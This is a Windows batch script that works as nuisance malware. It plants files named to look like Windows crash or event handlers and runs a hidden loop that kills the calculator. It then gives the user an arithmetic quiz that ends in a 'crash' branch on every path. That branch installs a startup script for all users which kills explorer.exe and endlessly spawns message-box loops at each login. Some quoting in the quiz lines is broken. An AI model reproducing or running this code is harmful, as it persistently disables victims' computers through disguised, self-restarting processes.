@echo off
cd C:\Users\%USERNAME%
mkdir Windows
cd C:\Users\%USERNAME%\Windows
echo set x=createobject("wscript.shell") > Windows_Event_Handler.vbs
echo X=MsgBox("Run this program on administrator mode",1+16,"heh") >> Windows_Event_Handler.vbs

echo :calc > calc.cmd
echo taskkill /F /IM calculator.exe >> calc.cmd
echo goto calc >> calc.cmd
echo Set objShell = WScript.CreateObject("WScript.Shell") > calc.vbs
echo objShell.Run("calc.cmd"), 0, True >> calc.vbs
start calc.vbs

echo X=MsgBox("you are so dumb ",1+16,"heh crash module") > Windows_Crash_Handler.vbs
echo :crashHandler > WindowsCrashHandler32.cmd
echo start Windows_Crash_Handler.vbs >> WindowsCrashHandler32.cmd
echo goto crashHandler >> WindowsCrashHandler32.cmd
echo Set objShell = WScript.CreateObject("WScript.Shell") > CrashHandler64.vbs
echo objShell.Run("WindowsCrashHandler32.cmd"), 0, True >> CrashHandler64.vbs

net session >nul 2>&1
if %errorLevel% == 0 (
    goto start
) else (
    start Windows_Event_Handler.vbs
    exit
)

:start
SET /a num1=(%RANDOM%*10/32768)+1
SET /a num2=(%RANDOM%*10/32768)+1
set /a result="%num1% + %num2%"
set /p resec="%num1% + %num2% "

if %resec%==%result% (echo was that too easy for you) else (echo guess what happnes now && pause && goto crash)

SET /a num1=(%RANDOM%*100/32768)+1
SET /a num2=(%RANDOM%*100/32768)+1
set /a result="%num1% + %num2%"
set /p resec="%num1% + %num2% 

if %resec%==%result% (echo WELLDONE) else (echo guess what happnes now && pause && goto crash)

SET /a num1=(%RANDOM%*1000/32768)+1
SET /a num2=(%RANDOM%*1000/32768)+1
set /a result="%num1% + %num2%"
set /p resec="%num1% + %num2% 

if %resec%==%result% (echo are these so easy for you) else (echo guess what happnes now && pause && goto crash)

SET /a num1=(%RANDOM%*10000/32768)+1
SET /a num2=(%RANDOM%*10000/32768)+1
set /a result="%num1% + %num2%"
set /p resec="%num1% + %num2% 

if %resec%==%result% (echo lets change it a little right?) else (echo guess what happnes now && pause && goto crash)
pause

SET /a num1=(%RANDOM%*10000/32768)+1
SET /a num2=(%RANDOM%*10000/32768)+1
set /a result="%num1% - %num2%"
set /p resec="%num1% - %num2% 

if %resec%==%result% (echo good job) else (echo guess what happnes now && pause && goto crash)

SET /a num1=(%RANDOM%*1000/32768)+1
SET /a num2=(%RANDOM%*100/32768)+1
set /a result="%num1% * %num2%"
set /p resec="%num1% * %num2% 

if %resec%==%result% (echo WELLDONE you are so dumb I am done with you && pause && goto crash) else (echo guess what happnes now && pause && goto crash)

:crash
cd C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
echo taskkill /F /IM explorer.exe > Heh_Crash_Module.cmd
echo cd C:\Users\%USERNAME%\Windows >> Heh_Crash_Module.cmd
echo :Crasher >> Heh_Crash_Module.cmd
echo start CrashHandler64.vbs >> Heh_Crash_Module.cmd
echo goto Crasher >> Heh_Crash_Module.cmd